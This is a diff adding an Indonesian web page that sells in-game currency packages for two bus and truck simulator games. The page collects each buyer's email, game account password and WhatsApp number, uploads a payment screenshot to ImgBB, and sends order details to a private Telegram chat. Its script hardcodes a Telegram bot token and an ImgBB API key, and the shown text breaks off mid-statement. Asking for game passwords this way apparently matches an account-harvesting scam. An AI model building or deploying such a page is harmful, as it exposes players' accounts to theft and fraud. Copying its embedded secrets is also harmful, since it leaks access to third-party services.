@@ -1,0 +1,1134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Top Up Game BUSSID/TRUKSID</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        :root {
+            --primary: #6c5ce7;
+            --primary-dark: #5649c0;
+            --secondary: #a29bfe;
+            --accent: #fd79a8;
+            --success: #00b894;
+            --danger: #d63031;
+            --warning: #fdcb6e;
+            --info: #0984e3;
+            --dark: #2d3436;
+            --light: #f8f9fa;
+            --card-bg: #ffffff;
+            --body-bg: #f5f6fa;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: var(--body-bg);
+            color: var(--dark);
+        }
+
+        .game-card {
+            border-radius: 16px;
+            border: none;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.08);
+            transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+            overflow: hidden;
+            background-color: var(--card-bg);
+        }
+
+        .game-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 12px 24px rgba(0, 0, 0, 0.12);
+        }
+
+        .game-card.selected {
+            border: 3px solid var(--primary);
+            box-shadow: 0 0 0 4px rgba(108, 92, 231, 0.2);
+        }
+
+        .game-img {
+            width: 100px;
+            height: 100px;
+            object-fit: cover;
+            border-radius: 12px;
+            border: 3px solid white;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .package-card {
+            border-radius: 12px;
+            border: none;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            background-color: var(--card-bg);
+            border: 1px solid rgba(0, 0, 0, 0.05);
+        }
+
+        .package-card:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
+        }
+
+        .package-card.selected {
+            border: 2px solid var(--primary);
+            background-color: rgba(108, 92, 231, 0.05);
+        }
+
+        .package-card.selected::after {
+            content: '\f00c';
+            font-family: 'Font Awesome 6 Free';
+            font-weight: 900;
+            position: absolute;
+            top: 8px;
+            right: 8px;
+            width: 24px;
+            height: 24px;
+            background-color: var(--primary);
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+        }
+
+        .step {
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .step.active {
+            display: block;
+        }
+
+        .btn-primary {
+            background-color: var(--primary);
+            border-color: var(--primary);
+            padding: 12px 24px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            border-radius: 10px;
+        }
+
+        .btn-primary:hover {
+            background-color: var(--primary-dark);
+            border-color: var(--primary-dark);
+        }
+
+        .btn-lg {
+            padding: 14px 28px;
+            font-size: 1.1rem;
+        }
+
+        .header {
+            background: linear-gradient(135deg, var(--primary), var(--accent));
+            color: white;
+            border-radius: 0 0 20px 20px;
+            padding: 20px 0;
+            box-shadow: 0 4px 12px rgba(108, 92, 231, 0.3);
+        }
+
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 30px;
+        }
+
+        .step-circle {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-color: var(--secondary);
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            margin: 0 10px;
+            position: relative;
+        }
+
+        .step-circle.active {
+            background-color: var(--primary);
+            transform: scale(1.1);
+        }
+
+        .step-circle.completed {
+            background-color: var(--success);
+        }
+
+        .step-circle::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 100%;
+            width: 20px;
+            height: 2px;
+            background-color: var(--secondary);
+        }
+
+        .step-circle:last-child::after {
+            display: none;
+        }
+
+        .qris-container {
+            background-color: white;
+            border-radius: 16px;
+            padding: 20px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.08);
+            max-width: 300px;
+            margin: 0 auto;
+        }
+
+        .qris-img {
+            width: 100%;
+            border-radius: 12px;
+            border: 1px solid #eee;
+        }
+
+        .confirm-box {
+            background-color: white;
+            border-radius: 16px;
+            padding: 20px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.08);
+            margin-bottom: 20px;
+        }
+
+        .upload-area {
+            border: 2px dashed #ddd;
+            border-radius: 12px;
+            padding: 30px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            background-color: rgba(255, 255, 255, 0.5);
+        }
+
+        .upload-area:hover {
+            border-color: var(--primary);
+            background-color: rgba(108, 92, 231, 0.05);
+        }
+
+        .preview-image {
+            max-width: 200px;
+            border-radius: 8px;
+            margin-top: 15px;
+            display: none;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .success-icon {
+            font-size: 80px;
+            color: var(--success);
+            margin-bottom: 20px;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 9999;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            color: white;
+        }
+
+        .spinner-large {
+            width: 4rem;
+            height: 4rem;
+        }
+
+        .success-message {
+            background: white;
+            padding: 30px;
+            border-radius: 20px;
+            text-align: center;
+            max-width: 500px;
+            margin: 0 auto;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+        }
+
+        .form-control {
+            border-radius: 10px;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+        }
+
+        .form-control:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 0 0.25rem rgba(108, 92, 231, 0.25);
+        }
+
+        .input-group-text {
+            border-radius: 10px 0 0 10px;
+            background-color: #f8f9fa;
+        }
+
+        .package-title {
+            font-weight: 600;
+            color: var(--primary);
+            margin-bottom: 15px;
+            position: relative;
+            padding-bottom: 8px;
+        }
+
+        .package-title::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 50px;
+            height: 3px;
+            background-color: var(--primary);
+            border-radius: 3px;
+        }
+
+        .price-tag {
+            background-color: var(--primary);
+            color: white;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+
+        .modal-content {
+            border-radius: 16px;
+            overflow: hidden;
+            border: none;
+        }
+
+        .modal-header {
+            background: linear-gradient(135deg, var(--primary), var(--accent));
+            color: white;
+        }
+
+        .btn-close {
+            filter: invert(1);
+        }
+
+        @media (max-width: 768px) {
+            .game-img {
+                width: 80px;
+                height: 80px;
+            }
+            
+            .step-circle {
+                width: 32px;
+                height: 32px;
+                font-size: 0.9rem;
+            }
+            
+            .package-card {
+                padding: 12px;
+            }
+        }
+    </style>
+</head>
+<body class="bg-light">
+    <!-- Header -->
+    <div class="header text-center mb-4">
+        <div class="container">
+            <h2 class="mb-0"><i class="fas fa-gamepad me-2"></i>TOP UP GAME</h2>
+        </div>
+    </div>
+
+    <div class="container py-4">
+        <div class="row justify-content-center">
+            <div class="col-lg-9">
+                <!-- Step Indicator -->
+                <div class="step-indicator mb-5">
+                    <div class="step-circle active" id="stepCircle1">1</div>
+                    <div class="step-circle" id="stepCircle2">2</div>
+                    <div class="step-circle" id="stepCircle3">3</div>
+                    <div class="step-circle" id="stepCircle4">4</div>
+                    <div class="step-circle" id="stepCircle5">5</div>
+                </div>
+                
+                <!-- Main Card -->
+                <div class="game-card mb-4">
+                    <!-- Step 1: Pilih Game -->
+                    <div id="step1" class="card-body step active">
+                        <h5 class="mb-4 text-center"><i class="fas fa-gamepad me-2"></i>Pilih Game</h5>
+                        <div class="row g-4" id="gameOptions">
+                            <div class="col-md-6">
+                                <div class="game-card p-4 text-center h-100 game-option" data-game="bussid">
+                                    <img src="https://i.ibb.co/zTpL60Yd/6a79c6b810420a84428ce8099b911b90.png" alt="BUSSID" class="game-img mb-3 mx-auto">
+                                    <h4 class="mb-2">BUSSID</h4>
+                                    <p class="mb-0 text-muted">Bus Simulator Indonesia</p>
+                                </div>
+                            </div>
+                            <div class="col-md-6">
+                                <div class="game-card p-4 text-center h-100 game-option" data-game="truksid">
+                                    <img src="https://i.ibb.co/M5ff0DYw/IMG-20250802-172929.jpg" alt="TRUKSID" class="game-img mb-3 mx-auto">
+                                    <h4 class="mb-2">TRUKSID</h4>
+                                    <p class="mb-0 text-muted">Truk Simulator Indonesia</p>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="d-grid mt-4">
+                            <button id="nextStep1" class="btn btn-primary btn-lg" disabled>
+                                <i class="fas fa-arrow-right me-2"></i>Lanjutkan
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <!-- Step 2: Pilih Nominal -->
+                    <div id="step2" class="card-body step">
+                        <h5 class="mb-4 text-center"><i class="fas fa-tags me-2"></i>Pilih Paket</h5>
+                        <div id="nominalOptions">
+                            <div class="text-center py-4">
+                                <div class="spinner-border text-primary" role="status">
+                                    <span class="visually-hidden">Loading...</span>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="d-grid gap-2 d-md-flex justify-content-md-between mt-4">
+                            <button id="prevStep2" class="btn btn-secondary">
+                                <i class="fas fa-arrow-left me-2"></i>Kembali
+                            </button>
+                            <button id="nextStep2" class="btn btn-primary" disabled>
+                                <i class="fas fa-arrow-right me-2"></i>Lanjutkan
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <!-- Step 3: Pembayaran QRIS -->
+                    <div id="step3" class="card-body step">
+                        <h5 class="mb-4 text-center"><i class="fas fa-qrcode me-2"></i>Pembayaran</h5>
+                        <div class="alert alert-info">
+                            <i class="fas fa-info-circle me-2"></i>Scan QR Code berikut untuk melakukan pembayaran via QRIS
+                        </div>
+                        
+                        <div class="qris-container mb-4">
+                            <img id="qrisImage" src="https://i.postimg.cc/K8KLb0rW/QRIS-7.png" 
+                                 alt="QRIS Payment" class="qris-img mb-3">
+                            <div class="confirm-box text-center">
+                                <h5>Total Pembayaran:</h5>
+                                <h3 class="text-success" id="paymentAmount">Rp 0</h3>
+                                <p class="text-muted mb-0">Transaksi akan diproses otomatis setelah pembayaran</p>
+                            </div>
+                        </div>
+                        
+                        <div class="d-grid gap-2 d-md-flex justify-content-md-between">
+                            <button id="prevStep3" class="btn btn-secondary">
+                                <i class="fas fa-arrow-left me-2"></i>Kembali
+                            </button>
+                            <button id="nextStep3" class="btn btn-success">
+                                <i class="fas fa-check-circle me-2"></i>Saya Sudah Bayar
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <!-- Step 4: Form Data Akun -->
+                    <div id="step4" class="card-body step">
+                        <h5 class="mb-4 text-center"><i class="fas fa-user-circle me-2"></i>Data Akun</h5>
+                        <div class="alert alert-warning">
+                            <i class="fas fa-exclamation-triangle me-2"></i>Pastikan data yang dimasukkan benar!
+                        </div>
+                        
+                        <form id="accountForm" novalidate>
+                            <div class="mb-3">
+                                <label for="email" class="form-label">Email Aktif</label>
+                                <div class="input-group">
+                                    <span class="input-group-text"><i class="fas fa-envelope"></i></span>
+                                    <input type="email" class="form-control" id="email" placeholder="contoh@gmail.com" required>
+                                </div>
+                                <div class="invalid-feedback">Harap masukkan email yang valid</div>
+                            </div>
+                            
+                            <div class="mb-3">
+                                <label for="password" class="form-label">Sandi Game</label>
+                                <div class="input-group">
+                                    <span class="input-group-text"><i class="fas fa-lock"></i></span>
+                                    <input type="password" class="form-control" id="password" placeholder="Password akun game" required>
+                                </div>
+                                <div class="invalid-feedback">Harap masukkan sandi game</div>
+                            </div>
+                            
+                            <div class="mb-3">
+                                <label for="phone" class="form-label">Nomor WhatsApp Aktif</label>
+                                <div class="input-group">
+                                    <span class="input-group-text"><i class="fas fa-phone"></i></span>
+                                    <input type="tel" class="form-control" id="phone" placeholder="08123456789" required pattern="[0-9]{10,13}">
+                                </div>
+                                <div class="invalid-feedback">Harap masukkan nomor WhatsApp yang valid (10-13 digit)</div>
+                                <small class="text-muted">Untuk konfirmasi dan notifikasi</small>
+                            </div>
+                            
+                            <!-- Upload Bukti Pembayaran -->
+                            <div class="mb-4">
+                                <label class="form-label">Upload Bukti Pembayaran</label>
+                                <div class="upload-area" id="uploadArea">
+                                    <i class="fas fa-cloud-upload-alt fa-3x mb-3 text-primary"></i>
+                                    <h5>Seret atau klik untuk upload</h5>
+                                    <p class="text-muted">Format: JPG, PNG (Maks. 2MB)</p>
+                                </div>
+                                <input type="file" id="paymentProof" class="d-none" accept="image/*" required>
+                                <div class="invalid-feedback">Harap upload bukti pembayaran</div>
+                                <img id="imagePreview" class="preview-image img-thumbnail mt-3" alt="Preview">
+                                <div class="progress mt-2" id="uploadProgress" style="display: none; height: 8px; border-radius: 4px;">
+                                    <div class="progress-bar progress-bar-striped progress-bar-animated" role="progressbar" style="width: 0%"></div>
+                                </div>
+                            </div>
+                            
+                            <div class="d-grid gap-2 d-md-flex justify-content-md-between mt-4">
+                                <button id="prevStep4" type="button" class="btn btn-secondary">
+                                    <i class="fas fa-arrow-left me-2"></i>Kembali
+                                </button>
+                                <button id="submitForm" type="submit" class="btn btn-success">
+                                    <i class="fas fa-paper-plane me-2"></i>Kirim & Selesaikan
+                                </button>
+                            </div>
+                        </form>
+                    </div>
+                    
+                    <!-- Step 5: Konfirmasi Selesai -->
+                    <div id="step5" class="card-body step">
+                        <div class="text-center py-4">
+                            <div class="success-icon">
+                                <i class="fas fa-check-circle"></i>
+                            </div>
+                            <h3 class="mb-3">Transaksi Berhasil!</h3>
+                            
+                            <div class="alert alert-success mb-4">
+                                <i class="fas fa-check-circle me-2"></i>
+                                <strong>Data akun Anda berhasil dikirim ke bot dan akan diproses.</strong> Silakan tunggu admin menghubungi kamu.
+                            </div>
+                            
+                            <div class="confirm-box text-start mb-4">
+                                <h5 class="text-center mb-3"><i class="fas fa-receipt me-2"></i>Detail Transaksi</h5>
+                                <p><strong>Game:</strong> <span id="confirmGame">-</span></p>
+                                <p><strong>Paket:</strong> <span id="confirmPackage">-</span></p>
+                                <p><strong>Harga:</strong> <span id="confirmAmount">-</span></p>
+                                <p><strong>ID Transaksi:</strong> <span id="confirmId">-</span></p>
+                                <p><strong>Bukti Pembayaran:</strong> <span id="confirmProof">-</span></p>
+                            </div>
+                            
+                            <p class="mb-4">TERIMA KASIH SUDAH ORDER. SILAKAN TUNGGU ADMIN MENGHUBUNGI KAMU 😘</p>
+                            
+                            <button id="newTransaction" class="btn btn-primary">
+                                <i class="fas fa-redo me-2"></i>Top Up Lagi
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal QRIS -->
+    <div class="modal fade" id="qrisModal" tabindex="-1" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title"><i class="fas fa-qrcode me-2"></i>Pembayaran QRIS</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <div class="modal-body text-center">
+                    <div class="qris-container">
+                        <img id="modalQrisImage" src="https://i.postimg.cc/K8KLb0rW/QRIS-7.png" 
+                             alt="QRIS Payment" class="qris-img mb-3">
+                        <div class="confirm-box">
+                            <h5>Total Pembayaran:</h5>
+                            <h4 class="text-success" id="modalPaymentAmount">Rp 0</h4>
+                        </div>
+                    </div>
+                    <p class="text-muted mt-3">Scan QR code menggunakan aplikasi mobile banking atau e-wallet</p>
+                </div>
+                <div class="modal-footer justify-content-center">
+                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">
+                        <i class="fas fa-times me-2"></i>Tutup
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div id="loadingOverlay" class="loading-overlay" style="display: none;">
+        <div class="spinner-border spinner-large text-light" role="status">
+            <span class="visually-hidden">Loading...</span>
+        </div>
+        <h4 class="mt-3">Mengirim data...</h4>
+    </div>
+
+    <!-- Success Message -->
+    <div id="successMessage" class="loading-overlay" style="display: none;">
+        <div class="success-message">
+            <i class="fas fa-check-circle success-icon"></i>
+            <h3>Data Berhasil Dikirim!</h3>
+            <p class="mb-4">Data akun Anda telah dikirim ke sistem kami. Silakan cek WhatsApp atau Telegram untuk instruksi selanjutnya.</p>
+            <button id="closeSuccess" class="btn btn-primary">Kembali ke Form</button>
+        </div>
+    </div>
+
+    <!-- JavaScript Libraries -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
+
+    <script>
+        // Inisialisasi Modal
+        const qrisModal = new bootstrap.Modal(document.getElementById('qrisModal'));
+
+        // Konfigurasi Telegram
+        const telegramConfig = {
+            botToken: '8114502494:AAGEpfA_KRvJ8ku_sG5Fhn17VTbfZd7nw-I',
+            chatId: '6977522417',
+            botUsername: '@TopUpGameBot'
+        };
+
+        // Data Transaksi dengan nilai default yang aman
+        let transactionData = {
+            game: null,
+            package: null,
+            option: null,
+            item_name: 'Paket belum dipilih',
+            amount: 0,
+            status: 'pending',
+            payment_method: 'qris',
+            user_data: {
+                email: '',
+                password: '',
+                phone: ''
+            },
+            payment_proof: null,
+            timestamp: null
+        };
+
+        // Data Paket
+        const gamePackages = {
+            bussid: {
+                name: "Bus Simulator Indonesia",
+                packages: {
+                    biasa: {
+                        name: "PAKET BIASA",
+                        options: {
+                            biasa1: { name: "50JT UB+20JT UB", price: 5000 },
+                            biasa2: { name: "200JT UB+20JT UB", price: 10000 },
+                            biasa3: { name: "250JT UB+20JT UB", price: 20000 },
+                            biasa4: { name: "300JT UB+30JT UB", price: 25000 }
+                        }
+                    },
+                    pro: {
+                        name: "PAKET PRO",
+                        options: {
+                            pro1: { name: "500JT UB+50JT UB", price: 30000 },
+                            pro2: { name: "700JT UB+50JT UB", price: 35000 },
+                            pro3: { name: "900JT UB+50JT UB", price: 40000 }
+                        }
+                    },
+                    premium: {
+                        name: "PAKET PREMIUM",
+                        options: {
+                            premium1: { name: "1M UB+500JT UB", price: 45000 },
+                            premium2: { name: "2M UB+MAX", price: 50000 }
+                        }
+                    }
+                }
+            },
+            truksid: {
+                name: "Truk Simulator Indonesia",
+                packages: {
+                    low: {
+                        name: "LOW PACKAGE",
+                        options: {
+                            low1: { name: "150JT UT", price: 10000 },
+                            low2: { name: "200JT UT", price: 15000 },
+                            low3: { name: "300JT UT", price: 20000 },
+                            low4: { name: "400JT UT", price: 25000 }
+                        }
+                    },
+                    medium: {
+                        name: "MEDIUM PACKAGE",
+                        options: {
+                            medium1: { name: "550JT UT", price: 30000 },
+                            medium2: { name: "650JT UT", price: 35000 },
+                            medium3: { name: "750JT UT", price: 45000 },
+                            medium4: { name: "850JT UT", price: 50000 },
+                            medium5: { name: "950JT UT", price: 55000 }
+                        }
+                    },
+                    premium: {
+                        name: "PAKET PREMIUM",
+                        options: {
+                            premium1: { name: "1,1MILIA UT", price: 60000 },
+                            premium2: { name: "1,5MILIA UT", price: 65000 },
+                            premium3: { name: "2 MILIA UT", price: 70000 }
+                        }
+                    }
+                }
+            }
+        };
+
+        // Fungsi untuk memvalidasi sebelum pindah step
+        function validateBeforeProceed(currentStep, nextStep) {
+            // Validasi dari step 1 ke step 2
+            if (currentStep === 1 && nextStep === 2) {
+                if (!transactionData.game) {
+                    showErrorAlert('Silakan pilih game terlebih dahulu');
+                    return false;
+                }
+            }
+            
+            // Validasi dari step 2 ke step 3
+            if (currentStep === 2 && nextStep === 3) {
+                if (!transactionData.package || !transactionData.option) {
+                    showErrorAlert('Silakan pilih paket terlebih dahulu');
+                    return false;
+                }
+            }
+            
+            // Validasi dari step 3 ke step 4
+            if (currentStep === 3 && nextStep === 4) {
+                if (!transactionData.amount || transactionData.amount <= 0) {
+                    showErrorAlert('Jumlah pembayaran tidak valid');
+                    return false;
+                }
+            }
+            
+            return true;
+        }
+
+        // Fungsi untuk menampilkan alert error
+        function showErrorAlert(message) {
+            const alertHtml = `
+                <div class="alert alert-danger alert-dismissible fade show" role="alert">
+                    <i class="fas fa-exclamation-circle me-2"></i>
+                    ${message}
+                    <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
+                </div>
+            `;
+            
+            // Tambahkan alert di atas konten step
+            $(`#step${currentStep}`).prepend(alertHtml);
+            
+            // Auto close setelah 3 detik
+            setTimeout(() => {
+                $('.alert-danger').alert('close');
+            }, 3000);
+        }
+
+        // Fungsi untuk berpindah step dengan validasi
+        function changeStep(current, next) {
+            if (!validateBeforeProceed(current, next)) {
+                return false;
+            }
+            
+            // Update step indicator
+            $(`#stepCircle${current}`).removeClass('active');
+            $(`#stepCircle${next}`).addClass('active');
+            if (current < next) {
+                $(`#stepCircle${current}`).addClass('completed');
+            }
+            
+            // Change step content
+            $(`#step${current}`).removeClass('active');
+            $(`#step${next}`).addClass('active');
+            
+            // Scroll ke atas
+            window.scrollTo(0, 0);
+            
+            return true;
+        }
+
+        // Step 1: Pilih Game
+        $('.game-option').click(function() {
+            $('.game-option').removeClass('selected');
+            $(this).addClass('selected');
+            
+            const selectedGame = $(this).data('game');
+            if (!selectedGame || !gamePackages[selectedGame]) {
+                showErrorAlert('Game tidak valid');
+                return;
+            }
+            
+            transactionData.game = selectedGame;
+            $('#nextStep1').prop('disabled', false);
+            loadPackages(selectedGame);
+        });
+
+        // Fungsi untuk memuat paket game
+        function loadPackages(game) {
+            try {
+                if (!game || !gamePackages[game]) {
+                    throw new Error('Game tidak valid');
+                }
+
+                const packages = gamePackages[game].packages;
+                $('#nominalOptions').empty();
+                
+                Object.keys(packages).forEach(pkgKey => {
+                    const pkg = packages[pkgKey];
+                    
+                    $('#nominalOptions').append(`
+                        <div class="package-section">
+                            <h6 class="package-title">${pkg.name || 'Paket'}</h6>
+                            <div class="row g-3" id="package-${pkgKey}"></div>
+                        </div>
+                    `);
+                    
+                    Object.keys(pkg.options).forEach(optKey => {
+                        const option = pkg.options[optKey];
+                        $(`#package-${pkgKey}`).append(`
+                            <div class="col-md-6">
+                                <div class="package-card p-3" data-package="${pkgKey}" data-option="${optKey}">
+                                    <div class="d-flex justify-content-between align-items-center">
+                                        <div>
+                                            <h6 class="mb-1 fw-bold">${option.name || 'Paket'}</h6>
+                                            <small class="text-muted">${game === 'bussid' ? 'BUSSID' : 'TRUKSID'}</small>
+                                        </div>
+                                        <div class="text-end">
+                                            <span class="price-tag">Rp ${(option.price || 0).toLocaleString('id-ID')}</span>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        `);
+                    });
+                });
+                
+                // Event listener untuk package card
+                $('.package-card').off('click').on('click', function() {
+                    $('.package-card').removeClass('selected');
+                    $(this).addClass('selected');
+                    
+                    const pkgKey = $(this).data('package');
+                    const optKey = $(this).data('option');
+                    
+                    if (!pkgKey || !optKey || !packages[pkgKey] || !packages[pkgKey].options[optKey]) {
+                        showErrorAlert('Data paket tidak valid');
+                        return;
+                    }
+                    
+                    const option = packages[pkgKey].options[optKey];
+                    
+                    transactionData.package = pkgKey;
+                    transactionData.option = optKey;
+                    transactionData.amount = option.price || 0;
+                    transactionData.item_name = option.name || 'Paket tidak diketahui';
+                    
+                    $('#paymentAmount, #modalPaymentAmount').text(`Rp ${(option.price || 0).toLocaleString('id-ID')}`);
+                    $('#nextStep2').prop('disabled', false);
+                });
+
+            } catch (error) {
+                console.error('Error loading packages:', error);
+                $('#nominalOptions').html(`
+                    <div class="alert alert-danger">
+                        <i class="fas fa-exclamation-triangle me-2"></i>
+                        Gagal memuat paket game: ${error.message}
+                    </div>
+                `);
+            }
+        }
+
+        // Navigation Between Steps
+        $('#nextStep1').click(() => {
+            if (changeStep(1, 2)) {
+                loadPackages(transactionData.game);
+            }
+        });
+        
+        $('#prevStep2').click(() => changeStep(2, 1));
+        
+        $('#nextStep2').click(() => {
+            if (changeStep(2, 3)) {
+                qrisModal.show();
+            }
+        });
+        
+        $('#prevStep3').click(() => changeStep(3, 2));
+        
+        $('#nextStep3').click(() => {
+            if (changeStep(3, 4)) {
+                qrisModal.hide();
+            }
+        });
+        
+        $('#prevStep4').click(() => changeStep(4, 3));
+        
+        $('#newTransaction').click(() => {
+            resetForm();
+            changeStep(5, 1);
+        });
+        
+        $('#closeSuccess').click(() => {
+            $('#successMessage').hide();
+        });
+
+        // Upload area
+        $('#uploadArea').click(function() {
+            $('#paymentProof').click();
+        });
+
+        // Preview image
+        function previewImage(file) {
+            if (!file) return false;
+            
+            // Validasi tipe file
+            const validTypes = ['image/jpeg', 'image/png'];
+            if (!validTypes.includes(file.type)) {
+                showErrorAlert('Format file tidak didukung. Harap upload gambar JPG atau PNG');
+                $('#paymentProof').val('');
+                return false;
+            }
+            
+            // Validasi ukuran file (maks 2MB)
+            if (file.size > 2 * 1024 * 1024) {
+                showErrorAlert('Ukuran file terlalu besar. Maksimal 2MB');
+                $('#paymentProof').val('');
+                return false;
+            }
+            
+            const reader = new FileReader();
+            
+            reader.onload = function(e) {
+                $('#imagePreview').attr('src', e.target.result).show();
+                $('#uploadArea').hide();
+            }
+            
+            reader.onerror = function() {
+                showErrorAlert('Gagal membaca file gambar');
+                $('#paymentProof').val('');
+            }
+            
+            reader.readAsDataURL(file);
+            return true;
+        }
+
+        $('#paymentProof').change(function() {
+            if (this.files && this.files[0]) {
+                if (previewImage(this.files[0])) {
+                    $(this).removeClass('is-invalid');
+                }
+            }
+        });
+
+        // Fungsi untuk upload gambar ke ImgBB
+        async function uploadToImgBB(file) {
+            if (!file) throw new Error('File tidak valid');
+            
+            const formData = new FormData();
+            formData.append('image', file);
+            
+            $('#uploadProgress').show();
+            const progressBar = $('#uploadProgress .progress-bar');
+            
+            try {
+                const response = await $.ajax({
+                    url: 'https://api.imgbb.com/1/upload?key=9d04842a4c2430722af9d98eb43c8294',
+                    type: 'POST',
+                    data: formData,
+                    processData: false,
+                    contentType: false,
+                    timeout: 30000,
+                    xhr: function() {
+                        const xhr = new window.XMLHttpRequest();
+                        xhr.upload.addEventListener('progress', function(e) {
+                            if (e.lengthComputable) {
+                                const percent = Math.round((e.loaded / e.total) * 100);
+                                progressBar.css('width', percent + '%').attr('aria-valuenow', percent);
+                            }
+                        });
+                        return xhr;
+                    }
+                });
+                
+                if (!response?.data?.url) {
+                    throw new Error('Gagal mengupload gambar: URL tidak valid');
+                }
+                
+                return response.data.url;
+            } catch (error) {
+                console.error('Upload error:', error);
+                throw new Error(`Gagal mengupload gambar: ${error.message}`);
+            } finally {
+                $('#uploadProgress').hide();
+            }
+        }
+
+        // Fungsi untuk mengirim notifikasi ke Telegram
+        async function sendTelegramNotification(transactionId, game, packageName, amount, paymentProofUrl, userData) {
+            if (!transactionId || !game || !userData?.phone) {
+                throw new Error('Data notifikasi tidak lengkap');
+            }
+            
+            const message = `
+📢 *Transaksi Baru* 📢
+🆔 ID Transaksi: ${transactionId}
+🎮 Game: ${game || 'Tidak diketahui'}
+📦 Paket: ${packageName || 'Tidak diketahui'}
+💰 Jumlah: Rp ${(amount || 0).toLocaleString('id-ID')}
+📧 Email: ${userData.email || 'Tidak ada'}
+📱 WhatsApp: ${userData.phone}
+            
+📎 Bukti Pembayaran: [Lihat Gambar](${paymentProofUrl || 'Tidak ada'})
+            `;
+            
+            try {
+                // Kirim ke admin
+                await $.ajax({
+                    url: `https://api.telegram.org/bot${telegramConfig.botToken}/sendMessage`,
+                    method: 'POST',
+                    data: {
+                        chat_id: telegramConfig.chatId,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    },
+                    timeout: 10000
+                });
+                
+                return true;
+            } catch (error) {
+                console.error('Telegram notification error:', error);
+                throw new Error(`Gagal mengirim notifikasi: ${error.message}`);
+            }
+        }
+
+        // Form submission handler
+        $('#accountForm').submit(async function(e) {
+            e.preventDefault();
+            
+            // Validasi form
+            const form = this;
+            if (!form.checkValidity()) {
+                e.stopPropagation();
+                form.classList.add('was-validated');
+                return;
+            }
+            
+            // Tampilkan loading overlay
+            $('#loadingOverlay').show();
+            
+            try {
+                // Validasi data transaksi
+                if (!transactionData.game || !transactionData.package) {
+                    throw new Error('Silakan lengkapi pemilihan game dan paket terlebih dahulu');
+                }
+                
+                // Simpan data user
+                transactionData.user_data = {
+                    email: $('#email').val() || '',
+                    password: $('#password').val() || '',
+                    phone: $('#phone').val() || ''
+                };
+                
+                // Upload bukti pembayaran
+                const proofFile = $('#paymentProof')[0].files[0];
+                if (proofFile) {
+                    transactionData.payment_proof = await uploadToImgBB(proofFile);
+                } else {
+                    throw new Error('Bukti pembayaran belum diupload');
+                }
+                
+                // Generate transaction ID
+                const transactionId = 'TXN-' + Date.now().toString().slice(-8);
+                transactionData.timestamp = new Date().toISOString();
+                
+                // Kirim notifikasi ke Telegram
+                await sendTelegramNotification(
+                    transactionId,
+                    gamePackages[transactionData.game]?.name || 'Game tidak diketahui',
+                    transactionData.item_name,
+                    transactionData.amount,
+                    transactionData.payment_proof,
+                    transactionData.user_data
+                );
+                
+                // Update confirmation details
+                $('#confirmGame').text(gamePackages[transactionData.game]?.name || 'Game tidak diketahui');
+                $('#confirmPackage').text(transactionData.item_name || 'Paket tidak diketahui');
+                $('#confirmAmount').text('Rp ' + (transactionData.amount?.toLocaleString('id-ID') || '0'));
+                $('#confirmId').text(transactionId);
+                $('#confirmProof').html(transactionData.payment_proof ? 
+                    `<a href="${transactionData.payment_proof}" target="_blank">Lihat Bukti</a>` : 
